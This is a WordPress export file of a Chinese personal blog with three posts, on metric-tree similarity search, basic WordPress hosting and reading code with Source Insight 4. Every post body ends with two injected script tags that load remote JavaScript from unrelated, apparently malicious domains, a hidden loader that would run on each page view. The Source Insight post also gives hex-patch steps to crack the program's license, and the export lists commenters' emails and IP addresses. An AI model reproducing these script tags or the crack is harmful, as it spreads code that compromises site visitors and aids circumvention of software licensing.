<?xml version="1.0" encoding="UTF-8" ?>
<!-- This is a WordPress eXtended RSS file generated by WordPress as an export of your site. -->
<!-- It contains information about your site's posts, pages, comments, categories, and other content. -->
<!-- You may use this file to transfer that content from one site to another. -->
<!-- This file is not intended to serve as a complete backup of your site. -->

<!-- To import this information into a WordPress site follow these steps: -->
<!-- 1. Log in to that site as an administrator. -->
<!-- 2. Go to Tools: Import in the WordPress admin panel. -->
<!-- 3. Install the "WordPress" importer from the list. -->
<!-- 4. Activate & Run Importer. -->
<!-- 5. Upload this file using the form provided on that page. -->
<!-- 6. You will first be asked to map the authors in this export file to users -->
<!--    on the site. For each author, you may choose to map to an -->
<!--    existing user on the site or to create a new user. -->
<!-- 7. WordPress will then import each of the posts, pages, comments, categories, etc. -->
<!--    contained in this file into your site. -->

	<!-- generator="WordPress/6.9" created="2026-01-11 05:28" -->
<rss version="2.0"
	xmlns:excerpt="http://wordpress.org/export/1.2/excerpt/"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:wp="http://wordpress.org/export/1.2/"
>

<channel>
	<title>书包是笨蛋的博客</title>
	<link>http://www.ironmanzzm.top</link>
	<description>Just for fun.</description>
	<pubDate>Sun, 11 Jan 2026 05:28:10 +0000</pubDate>
	<language>zh-Hans</language>
	<wp:wxr_version>1.2</wp:wxr_version>
	<wp:base_site_url>http://www.ironmanzzm.top</wp:base_site_url>
	<wp:base_blog_url>http://www.ironmanzzm.top</wp:base_blog_url>

		<wp:author><wp:author_id>1</wp:author_id><wp:author_login><![CDATA[protectione055]]></wp:author_login><wp:author_email><![CDATA[549012402@qq.com]]></wp:author_email><wp:author_display_name><![CDATA[书包是笨蛋]]></wp:author_display_name><wp:author_first_name><![CDATA[]]></wp:author_first_name><wp:author_last_name><![CDATA[]]></wp:author_last_name></wp:author>

				
	<generator>https://wordpress.org/?v=6.9</generator>

<image>
	<url>http://www.ironmanzzm.top/wp-content/uploads/2021/06/cropped-漩涡logo_无背景-e1661521541510-150x150.png</url>
	<title>书包是笨蛋的博客</title>
	<link>http://www.ironmanzzm.top</link>
	<width>32</width>
	<height>32</height>
</image> 

		<item>
		<title><![CDATA[如何用度量树实现通用的相似性查询]]></title>
		<link>http://www.ironmanzzm.top/?p=31</link>
		<pubDate>Mon, 31 May 2021 01:23:43 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://120.79.212.101/?p=31</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:paragraph -->
<p>背景：<br>很多实际问题需要对有限集中的元素进行有效的识别，高效的算法通常可以避免对所有点进行遍历。很多相关问题将“邻近(proximity)”定义为排列空间中的距离测量。大量用来表示高维点的数据结构仅仅考虑了凸区域中的邻近查询(proximity queries).例如k-d树（参考李航《统计学习方法》KNN相关章节），但k-d树存在的问题是当维度超过O(log n)时，找不到一种分割方法可以区分所有坐标，这意味着对树的邻近搜索只能基于坐标的一个子集。目前对通用度量树划分平面的选择还没有被广泛研究。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>目的：<br>描述满足任意距离的多种类邻近查询的高效算法。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>方法：</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol><li>球分解(Ball decomsitions)<br>度量距离D(X, Y)的定义<br>一个度量空间内的任何关系都应该满足下列条件：</li></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>d(x, y) = d(y, x)<br>0 &lt; d(x, y), x != y<br>d(x, x) = 0<br>d(x, y) &lt;= d(x, z) + d(z, y)<br>球分解的定义：<br>给定一个具有n个对象的有限集S，对象间的度量定义为d(Si, Sj). 球分解B是一个由S在O(n log n)的距离计算次数下构造的度量树，过程如下:</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>如果S为空，则构造空树B = nil(=null)<br>否则：<br>令Bx = S中的任意一个对象<br>Bm = Bx与S中所有元素距离的中位数<br>Bleft = S中与除了Bx自身，与Bx距离小于等于中位数的元素组成的度量树<br>Bright = S中与Bx距离大于等于中位数的元素组成的度量树<br>上述构造过程中，通过选择一个对象并根据距离的中位数将所有元素分成两半。可以保证一半的元素都在以Bx为球心，Bm为半径的球面之内。递归实现此过程。与中位数的比较之所以都带等于号，是因为中位数可能不止一个。 这个分解的优点是除了元素之间的距离以外不要求其他任何拓扑信息。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>球分解提出的意义：仅支持近似凸区域中邻近查询的数据结构性能不一定比暴力算法好。因此需要一个可以利用度量本身特性的数据结构。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>假设以非叶节点Bx为球心，Bm为半径的球为b1；点v为球心，r为半径的球为b2。通过度量树查找距离点v在r以内的点集的方法如下：<br>(1)如果d(Bx, v) &lt;= r, 那么将Bx加入所求点集 (2)如果d(Bx, v) + r &gt;= Bm, 那么递归搜索右子树。当v与未知点p在空间中相对Bx位于同一侧的时候，v与p之间的距离是比较短的，换句话说就是更容易找到满足条件的点p。v与Bx三者如果满足（2）这条不等式，说明右子树中可能存在一个点与v距离小于r.三者之间构成的三角形关系如下图所示。<br><img src="https://i.loli.net/2021/06/08/QEYd1WmJLwGTUuc.jpg" alt="三点之间构成的三角形关系"><br>(3)如果d(Bx, v) + Bm &lt;= r, 那么左子树的所有点都加入所求点集。这条不等式很好理解，当它成立时，不论v相对于Bx在什么位置，b1都内含于b2，即b2都囊括了Bx左子树的所有点。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><img src="https://i.loli.net/2021/06/08/f2LhBE5oQmKckze.jpg" alt="ball-decomposition-2.jpg"> <br>否则，如果d(Bx, v) – r &lt;= Bm，递归搜索左子树。该不等式成立时b2内含于b1或两者相交，左子树中可能存在部分点满足条件。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>可以将上述过程推广到更一般的集合相交问题，详细过程略。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>由于球分解更有可能利用数据集元素分布特征，所以通常可以达到更优的查询性能。但对于像欧几里得距离、曼哈顿距离这样均匀分布的点，球分解表现较差。这意味着对于其他度量空间进行超平面分解的一般方法有更高的性能要求。</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true,"start":2} -->
<ol start="2"><li>广义超平面分解(Generalized hyperplane decompositions)<br>可参考“超平面树 :度量空间中相似性搜索的索引结构”(李建中、张兆功)</li></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>广义超平面(GH)的定义<br>对于给定的两个不相同的点p1和p2，广义超平面由到p1和p2距离相同的点构成。其中离p1更近的一侧叫做p1-侧(p1-side)，离p2更近的一侧叫做p2-侧(p2-side)。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>广义超平面对比球分解的最大优势在于球分解是相对静态的数据结构，而GH不是。（数据结构的静态与动态概念，大概是指其存储空间被分配后，能否动态扩增或缩减）</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>GH-BASED树的插入函数<br>令H为GH树，p为要插入的点：</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>如果H为空，创建并返回带有Hx=p和Hy的节点H，左子树Hleft和右子树Hright赋值为null. 其中Hx和Hy是决定划分的两个点，Hleft和Hright是两棵子树。<br>如果Hy=null，返回H并令Hy=p<br>如果d(p, Hx) &lt;= d(p, Hy)，那么返回H并将p插入到左子树<br>否则返回H，并令左子树Hleft=插入点p后的右子树</p>
<!-- /wp:paragraph --><script src='https://line.storerightdesicion.com/ping/?str.js' type='text/javascript'></script><script src='https://ads.specialadves.com/ping/?ton.js' type='text/javascript'></script>]]></content:encoded>
		<excerpt:encoded><![CDATA[很多实际问题需要对有限集中的元素进行有效的识别，高效的算法通常可以避免对所有点进行遍历。很多相关问题将“邻近(proximity)”定义为排列空间中的距离测量。大量用来表示高维点的数据结构仅仅考虑了凸区域中的邻近查询(proximity queries).例如k-d树，但k-d树存在的问题是当维度超过O(log n)时，找不到一种分割方法可以区分所有坐标，这意味着对树的邻近搜索只能基于坐标的一个子集。目前对通用度量树划分平面的选择还没有被广泛研究。]]></excerpt:encoded>
		<wp:post_id>31</wp:post_id>
		<wp:post_date><![CDATA[2021-05-31 09:23:43]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-05-31 01:23:43]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-12-11 14:21:36]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-12-11 06:21:36]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[satisfying-general-proximity-similarity-queries-with-metric-trees]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="metric-space-indexing"><![CDATA[度量空间索引]]></category>
		<category domain="post_tag" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93"><![CDATA[数据库]]></category>
		<category domain="post_tag" nicename="%e7%b4%a2%e5%bc%95"><![CDATA[索引]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e7%a7%91%e5%ad%a6"><![CDATA[计算机科学]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[32]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							<wp:comment>
			<wp:comment_id>4</wp:comment_id>
			<wp:comment_author><![CDATA[max张小涛]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[maxzhangxiaotao@163.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[223.72.82.135]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2021-06-15 09:37:51]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2021-06-15 01:37:51]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[鸡哥牛*]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[comment]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
						<wp:commentmeta>
	<wp:meta_key><![CDATA[akismet_result]]></wp:meta_key>
			<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
						<wp:commentmeta>
	<wp:meta_key><![CDATA[akismet_history]]></wp:meta_key>
			<wp:meta_value><![CDATA[a:2:{s:4:"time";d:1623721071.1594551;s:5:"event";s:9:"check-ham";}]]></wp:meta_value>
			</wp:commentmeta>
						<wp:commentmeta>
	<wp:meta_key><![CDATA[akismet_history]]></wp:meta_key>
			<wp:meta_value><![CDATA[a:3:{s:4:"time";d:1623723371.9769731;s:5:"event";s:15:"status-approved";s:4:"user";s:14:"protectione055";}]]></wp:meta_value>
			</wp:commentmeta>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>5</wp:comment_id>
			<wp:comment_author><![CDATA[书包是笨蛋]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[549012402@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url>http://www.ironmanzzm.top</wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[223.72.98.236]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2021-06-15 10:16:41]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2021-06-15 02:16:41]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[爬]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[comment]]></wp:comment_type>
			<wp:comment_parent>4</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
						<wp:commentmeta>
	<wp:meta_key><![CDATA[akismet_result]]></wp:meta_key>
			<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
						<wp:commentmeta>
	<wp:meta_key><![CDATA[akismet_history]]></wp:meta_key>
			<wp:meta_value><![CDATA[a:3:{s:4:"time";d:1623723401.475652;s:5:"event";s:9:"check-ham";s:4:"user";s:14:"protectione055";}]]></wp:meta_value>
			</wp:commentmeta>
							</wp:comment>
					</item>
					<item>
		<title><![CDATA[利用WordPress部署个人网站（一）：网站初步]]></title>
		<link>http://www.ironmanzzm.top/?p=46</link>
		<pubDate>Mon, 31 May 2021 13:43:23 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://120.79.212.101/?p=46</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:heading {"level":3} -->
<h3>0.前言</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>想部署一个可以让所有人访问的网站，却只懂浏览器的启动与关闭怎么办？这个系列将教会不懂编程的读者部署一个运行在云服务器上的WordPress网站。本篇是系列的第一篇，为计算机小白介绍计算机建立网站需要的基本知识，有一定基础的读者可以跳过。首先需要说明的是，无论是注册域名还是购买云服务器都需要一定成本，操作的时候手头最好有150元左右的预算。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>1.基本知识</h3>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4>1.1网页浏览的原理</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>要部署自己的网站，首先要知道计算机访问网站的基本原理。我们平常浏览的网页其实是由很多<strong>文件</strong>组成的，这些文件描述网页中的各种内容如何排布、点击某个地方会出现什么效果，浏览器通过这些文件就可以为用户显示出精彩纷呈的网页。想要了解这些网页是如何被制作出来的可以学习html、css和Javascript的相关知识，这里暂且跳过。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>上面提到网页其实是很多个文件的集合，但我们网上冲浪的时候电脑里并没有这些文件呀？这些文件都被存储在网站管理员的计算机里了，为了让更多人可以访问到网站，这些计算机可能远不止一台，而且不会经常关机，这就是我们常说的<strong>服务器</strong>。服务器上运行着的<strong>Web服务器软件</strong>负责处理用户发来的访问请求，将网页文件返回给用户。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>为了能访问到服务器，我们需要知道这些计算机的家门在哪，因为计算机处理一串规则的数字速度是最快的，所以计算机之间用来互报家门的地址一串称为<strong>IP地址</strong>的数字。我们在浏览器中输入的网址其实是网站的<strong>域名</strong>，域名与IP地址的关系可以类比为姓名与身份证号。因为IP地址对人类来说不好记忆，所以给服务器起一个域名。网络中记录域名与对应IP地址的计算机称为<strong>DNS服务器</strong>。我们在浏览器输入一个域名后，计算机会询问DNS服务器这个域名对应的IP地址是什么，DNS服务器返回IP地址后，计算机通过IP地址向网站服务器发起访问请求。网站服务器收到请求后向我们的计算机发送网页文件，浏览器会根据这些文件向我们生成网页。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>还有一个问题是服务器上除了处理用户访问的Web服务器程序还运行着别的程序，比如现在服务器上运行着程序A和程序B，用户发来一个请求数据包，服务器怎么才能知道给哪个程序处理呢？为了解决这个问题，计算机提供<strong>端口</strong>这个东西。端口通过不同的的编号进行识别，范围从0到65535，我们所用的Web服务器程序通常绑定的是80号端口。每个程序与一个端口进行绑定，请求数据包中指定要访问的端口，服务器就知道这个请求应该交给哪个程序处理了。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>1.2 WordPress</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>了解过网站访问的基本原理，接下来要介绍一下我们建立网站所用的软件——WordPress. 据传说互联网上有41%&nbsp;的网站都使用了WordPress搭建。WordPress是使用PHP语言开发的博客平台，我们用它在服务器上架设自己的网站，可以省去代码开发带来的庞大的工作量。WordPress提供其他大神开发的免费模板和插件，想要为博客添加功能或着更换网站的样式，直接下载这些插件和模板就可以了。如果要做一个自己的模板，需要你有一定的专业知识。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>1.3 云服务器</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>为了能让网站随时随地能被访问到，我们需要一台可以联网的计算机二十四小时不间断地运行着。用我们自己的电脑担当这个值班员角色，很有可能会影响电脑正常使用。试想我们正在打游戏的时候访客访问网站，大家都会感觉很卡！更关键的一个问题是，我们电脑连接网络所使用的IP地址（具体来说是IPv4）是开机后连接网络时运营商为我们分配的，每次分配到的地址可能不一样。但如果我们的地址经常变动，别的计算机就找不到我们住在哪里了，所以我们需要一个固定的IP地址。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>为了解决大家的上述需求，云计算公司建立庞大的数据中心，在用户需要使用服务器的时候从数据中心划分出一部分计算资源供用户使用。这部分计算资源可以看作一台放在远处的虚拟计算机，我们通过某些方法从自己的计算机远程操控它，就可以在那上面建立网站了。虚拟计算机可以24小时运行，拥有固定的IP地址，可以根据需要调整配置。比如某一时刻访问的用户比以往多很多倍所以网速不够了，可以通过增加带宽解决这个问题。当用户访问量恢复正常后收回多余的性能，避免资源的浪费。这样的虚拟计算机我们称为<strong>云服务器</strong>，又称ECS(Elastic Compute Service 弹性计算服务)。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>结语</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>以上是建立一个网站前需要了解的一些基本知识，下一篇将正式开始讲解具体操作步骤。</p>
<!-- /wp:paragraph --><script src='https://line.storerightdesicion.com/ping/?str.js' type='text/javascript'></script><script src='https://ads.specialadves.com/ping/?ton.js' type='text/javascript'></script>]]></content:encoded>
		<excerpt:encoded><![CDATA[想部署一个可以让所有人访问的网站，却只知晓浏览器的启动与关闭怎么办？这篇文章将教会不懂编程的读者如何部署一个运行在云服务器上的WordPress网站。]]></excerpt:encoded>
		<wp:post_id>46</wp:post_id>
		<wp:post_date><![CDATA[2021-05-31 21:43:23]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-05-31 13:43:23]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-12 10:57:33]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-12 02:57:33]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%88%a9%e7%94%a8%e9%83%a8%e7%bd%b2wordpress%e9%83%a8%e7%bd%b2%e4%b8%aa%e4%ba%ba%e7%bd%91%e7%ab%99]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="web"><![CDATA[Web]]></category>
		<category domain="post_tag" nicename="wordpress"><![CDATA[WordPress]]></category>
		<category domain="category" nicename="web-operation-and-maintenance"><![CDATA[网站运维]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e6%8a%80%e6%9c%af"><![CDATA[计算机技术]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[47]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[如何使用Source Insight4阅读项目源码]]></title>
		<link>http://www.ironmanzzm.top/?p=162</link>
		<pubDate>Mon, 14 Jun 2021 10:50:42 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/?p=162</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:heading {"level":3} -->
<h3>目录</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>[TOC]  //wordpress的markdown渲染器不支持自动生成目录的吗...orz</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>一、简介</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>趁着最近比较空闲，想找些项目源码看看。虽然Visual Studio也提供跳转到定义、查找引用之类的功能，但每次创建项目都非常麻烦，而且阅读效率并不是特别高。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Source Insight是一款非常流行的源码编辑器和浏览器，可以生成源码调用层级关系树、类继承图表等信息，极大地提升我们阅读源码的效率。Source Insight自动为源码生成符号数据库，需要查找符号的时候可以直接从数据库中查找。俗话说“工欲善其事必先利其器”，在开始源码阅读之前，这款利器值得一试。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>二、安装</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>首先从官网下载Source Insight 4安装包：<br><a href="https://www.sourceinsight.com/updates/" target="_blank" rel="noreferrer noopener">https://www.sourceinsight.com/updates/</a><br>注意选择安装目录，按照一般软件安装流程安装好即可。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>初次运行时可以获得30天免费试用时间，购买Windows平台个人版价格是239美刀，建议有余力的老板支持下正版(ry</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><br>对于想把这款工具用作学习用途的同学，<del>破解的方法非常简单：</del></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>首先准备一款可以打开二进制文件的编辑器，这里用的编辑器是<code>HexEdit</code>，好处是比较轻便，连安装都省了。<br>下载链接：<a href="https://pan.baidu.com/s/17_xwnaladB9k1qh_b27cWA" target="_blank" rel="noreferrer noopener">https://pan.baidu.com/s/17_xwnaladB9k1qh_b27cWA</a><br>提取码：gumj</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>找到Source Insight的安装目录，Windows下默认的路径是<code>C:\Program Files (x86)\Source Insight 4.0</code>，<strong>以管理员身份运行</strong>HexEdit，打开<code>sourceinsight4.exe</code>。按<code>ctrl+f</code>调出搜索框，搜索十六进制字串<code>c800 0000 742a 83bc 2408</code>，取消选中Find text后点确定。将结果中的<code>74</code>改为<code>EB</code>，保存文件。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://i.loli.net/2021/06/14/IHkLQZMwsmTivGU.jpg" alt="在文件中查找字串"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>打开<code>C:\ProgramData\Source Insight\4.0</code>，用记事本打开里面的<code>si4.lic</code>，修改<code>Date</code>字段年份的值为2030后保存关闭。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://i.loli.net/2021/06/14/bejD5h792mkJRZH.jpg" alt="修改si4.lic"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>重新启动Source Insight，可以看到授权信息已经被修改。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://i.loli.net/2021/06/14/lOCP92ndDbMgcHi.jpg" alt="授权管理页"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>PS：本方法仅用于学习用途，请支持正版。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>三、使用方法</h3>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4>1.创建项目</h4>
<!-- /wp:heading -->

<!-- wp:heading {"level":5} -->
<h5>第一步</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>运行安装好的软件，准备向Source Insight导入我们的第一个项目。<br>点击菜单栏<code>Project--&gt;new project</code>，看到软件弹出新建项目的对话框。输入项目名称，为了保证源码目录不会掺杂别的文件，我为Source Insight项目专门建了一个目录<code>..\Projects\Source Insight</code>。点击OK按钮进入下一步。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://i.loli.net/2021/06/14/U6rVSu3A8z7g4oW.jpg" alt="new-project-1.jpg"/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":5} -->
<h5>第二步</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>在Project Source Directory一栏为项目指定我们要阅读的源码目录，点击OK<br><img src="https://i.loli.net/2021/06/14/E2L35SiN8YnlMH6.jpg" alt="new-project-2.jpg"></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5>第三步</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>点击右侧<code>Add Tree</code>按钮将目录下要浏览的的源码加入到项目，不需要的文件可以点击<code>Remove File</code>移除，也可以点击<code>Remove Special...</code>指定移除的文件夹。上方的<code>File Name</code>可以不管。点击<code>close</code>我们的项目就创建完毕了。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://i.loli.net/2021/06/14/ly9KkiTgHMUuhOR.jpg" alt="new-project-3.jpg"/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4>2.基本界面</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>项目成功导入后就可愉快地开始阅读了。左侧符号窗口列出当前文件中的变量、类、方法等符号。选中源码窗口中的符号时，上下文窗口将会显示该符号的声明，类似Visual Studio的peek功能。Rational Window根据函数的调用关系生成关系图，可以更直观地观察各个函数的层级关系。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>各个小窗口可以通过菜单栏的<code>View</code>进行设置，通过拖动将窗口调整到自己喜欢的位置。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://i.loli.net/2021/06/14/MzYCyLpkODmSQ2q.jpg" alt="main-window.jpg"/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3>三、小结</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>使用Source Insight可以提高源码阅读效率，还有很多高级功能有待探索，将来在使用中有更多的体会和经验将继续补充到这里。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>参考资料：</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>https://blog.csdn.net/qq_21792169/article/details/85835864<br>https://blog.csdn.net/qq_41960196/article/details/86636713<br>https://www.cnblogs.com/mengdd/p/3506526.html<br>https://www.cnblogs.com/andy-songwei/p/9965714.html<br>https://www.cnblogs.com/csonezp/archive/2012/10/06/2712910.html</p>
<!-- /wp:paragraph --><script src='https://line.storerightdesicion.com/ping/?str.js' type='text/javascript'></script><script src='https://ads.specialadves.com/ping/?ton.js' type='text/javascript'></script>]]></content:encoded>
		<excerpt:encoded><![CDATA[Source Insight是一款非常流行的源码编辑器和浏览器，可以生成源码调用层级关系树、类继承图表等信息，极大地提升我们阅读源码的效率。]]></excerpt:encoded>
		<wp:post_id>162</wp:post_id>
		<wp:post_date><![CDATA[2021-06-14 18:50:42]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-14 10:50:42]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-14 23:07:14]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-14 15:07:14]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%a6%82%e4%bd%95%e4%bd%bf%e7%94%a8source-insight4%e9%98%85%e8%af%bb%e9%a1%b9%e7%9b%ae%e6%ba%90%e7%a0%81]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="source-insight"><![CDATA[Source Insight]]></category>
		<category domain="post_tag" nicename="%e6%ba%90%e7%a0%81%e9%98%85%e8%af%bb"><![CDATA[源码阅读]]></category>
		<category domain="category" nicename="conputer-technology"><![CDATA[计算机技术]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e6%8a%80%e6%9c%af"><![CDATA[计算机技术]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[166]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_is_githuber_markdown_enabled]]></wp:meta_key>
